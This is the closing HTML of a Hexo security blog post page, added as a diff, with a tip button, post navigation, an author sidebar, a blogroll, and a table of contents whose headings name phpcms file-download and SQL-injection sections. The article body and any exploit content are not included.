+  <button id="rewardButton" disable="enable" style="width: 80px;line-height: 38px;text-align: center;font-weight: bold;color: #fff;border-radius: 5px;
+margin:0 20px 20px 0;position: relative;overflow: hidden;color: #8c96a0;text-shadow:1px 1px 1px #fff;border:1px solid #dce1e6;box-shadow: 0 1px 2px #fff inset,0 -1px 0 #a8abae inset;background: -webkit-linear-gradient(top,#f2f3f7,#e4e8ec);background: -moz-linear-gradient(top,#f2f3f7,#e4e8ec);background: linear-gradient(top,#f2f3f7,#e4e8ec);" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    打赏
+  </button>
+  <div id="QR" style="display: none;">
+    
+      <div id="wechat" style="display: inline-block;width:150px;height:150px">
+        <img id="wechat_qr" src="/images/wechat.png" alt="Phyb0x WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+    
+    
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/04/phpmyadmin%E6%8F%90%E6%9D%83/" rel="next" title="phpmyadmin提权">
+                <i class="fa fa-chevron-left"></i> phpmyadmin提权
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/09/seacms%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/" rel="prev" title="seacms命令执行分析">
+                seacms命令执行分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://b-ssl.duitang.com/uploads/item/201710/05/20171005185843_HmGKQ.jpeg"
+                alt="Phyb0x" />
+            
+              <p class="site-author-name" itemprop="name">Phyb0x</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://cdusec.happyhacking.top" title="CDUSEC" target="_blank">CDUSEC</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://nbsec.xyz/" title="大熊's Blog" target="_blank">大熊's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://a3ura.github.io/" title="a3ura's Blog" target="_blank">a3ura's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://a-running-snail2333.github.io/blog.github.io/" title="a-running-snail's Blog" target="_blank">a-running-snail's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpcms9-6-1"><span class="nav-number">2.</span> <span class="nav-text">phpcms9.6.1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#9-6-1-任意文件下载"><span class="nav-number">2.1.</span> <span class="nav-text">9.6.1 任意文件下载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpcms9-6-2"><span class="nav-number">3.</span> <span class="nav-text">phpcms9.6.2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#任意文件读取"><span class="nav-number">3.1.</span> <span class="nav-text">任意文件读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqli"><span class="nav-number">3.2.</span> <span class="nav-text">sqli</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Phyb0x</span>
+
+  <div class="powered-by">
+  <i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+  本站访客数:<span id="busuanzi_value_site_pv"></span>次
+  </span>
+  </div>
+
+  
+</div>
+
+<!-- 
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_lines.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
